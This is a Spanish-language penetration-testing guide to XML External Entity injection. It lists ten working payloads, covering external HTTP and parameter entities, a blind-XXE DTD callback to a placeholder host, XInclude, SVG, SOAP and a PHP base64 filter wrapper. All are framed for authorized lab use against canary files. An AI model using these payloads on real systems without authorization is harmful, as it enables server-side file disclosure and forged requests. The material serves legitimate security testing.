# 🗡️ XML External Entity (XXE): payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. Control: entidad interna

**Objetivo:** Establecer que el parser acepta DTD y expande una entidad sin acceso a red.

```xml
<!DOCTYPE r [<!ENTITY marca "prueba-123">]><r>&marca;</r>
```

**Interpretación:** Si aparece prueba-123, solo se confirmó expansión interna; aún falta demostrar entidad externa.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md).

### 2. Entidad HTTP externa

**Objetivo:** Resolver un URL HTTPS de dominio propio con identificador único.

```xml
<!DOCTYPE r [<!ENTITY xxe SYSTEM "https://{CONTROLLED_HOST}/xxe-prueba-123">]><r>&xxe;</r>
```

**Interpretación:** Correlacionar callback con request del backend; un prefetch del navegador o antivirus no cuenta.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md).

### 3. Archivo canary local

**Objetivo:** Solo laboratorio donde el tester creó el archivo fuera de la carpeta de entrada.

```xml
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///tmp/xxe-canary.txt">]><r>&xxe;</r>
```

**Interpretación:** La respuesta debe contener el contenido único del archivo de prueba, no solo el literal de la entidad.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md).

### 4. XInclude sin DOCTYPE

**Objetivo:** Para inyección en un nodo XML donde no se puede definir DTD; usar canary de laboratorio.

```xml
<r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///tmp/xxe-canary.txt"/></r>
```

**Interpretación:** Solo aplica si el procesador tiene XInclude habilitado; la no inclusión no descarta XXE por DTD.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md).

### 5. SVG con entidad externa

**Objetivo:** Cuando la subida de SVG se analiza en servidor, no solo se sirve como archivo estático.

```xml
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "https://{CONTROLLED_HOST}/svg-prueba-123">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

**Interpretación:** Registrar solicitud desde el procesador; si viene del navegador al ver SVG, no es XXE servidor.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md).

### 6. SOAP XML

**Objetivo:** En un endpoint SOAP de laboratorio que acepta DOCTYPE.

```xml
<!DOCTYPE Envelope [<!ENTITY xxe SYSTEM "https://{CONTROLLED_HOST}/soap-prueba-123">]><Envelope xmlns="http://schemas.xmlsoap.org/soap/envelope/"><Body><x>&xxe;</x></Body></Envelope>
```

**Interpretación:** Comparar con SOAP sin DTD; el rechazo por esquema puede impedir alcanzar parser vulnerable.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md).

### 7. DTD externo para XXE ciega

**Objetivo:** Hospedar una DTD propia con una entidad de callback; requiere parser que permita entidades de parámetro externas.

```xml
<!DOCTYPE r [<!ENTITY % dtd SYSTEM "https://{CONTROLLED_HOST}/prueba.dtd"> %dtd;]><r>prueba</r>

<!-- Contenido de prueba.dtd alojado por el tester: -->
<!ENTITY % cb SYSTEM "https://{CONTROLLED_HOST}/dtd-callback-123">
%cb;
```

**Interpretación:** Distinguir descarga de la DTD de la segunda llamada; ninguna implica lectura de archivo.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md).

### 8. Entidad PUBLIC externa

**Objetivo:** Algunos parsers tratan PUBLIC y SYSTEM de modo similar; host propio solamente.

```xml
<!DOCTYPE r [<!ENTITY xxe PUBLIC "id-prueba" "https://{CONTROLLED_HOST}/public-123">]><r>&xxe;</r>
```

**Interpretación:** Solo un callback desde parser muestra resolución; un error de DTD no descarta SYSTEM.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md).

### 9. Entidad de parámetro externa

**Objetivo:** Cuando el parser resuelve entidades dentro del DTD.

```xml
<!DOCTYPE r [<!ENTITY % p SYSTEM "https://{CONTROLLED_HOST}/param-123"> %p;]><r>prueba</r>
```

**Interpretación:** La descarga del recurso confirma resolución de parámetros; no implica acceso a archivos.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md).

### 10. Wrapper PHP sobre canary

**Objetivo:** Solo laboratorio PHP con archivo propio; devolver base64 facilita observar contenido no XML.

```xml
<!DOCTYPE r [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/tmp/xxe-canary.txt">]><r>&xxe;</r>
```

**Interpretación:** Decodificar únicamente el canary de prueba; la disponibilidad del wrapper depende del parser y de PHP.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
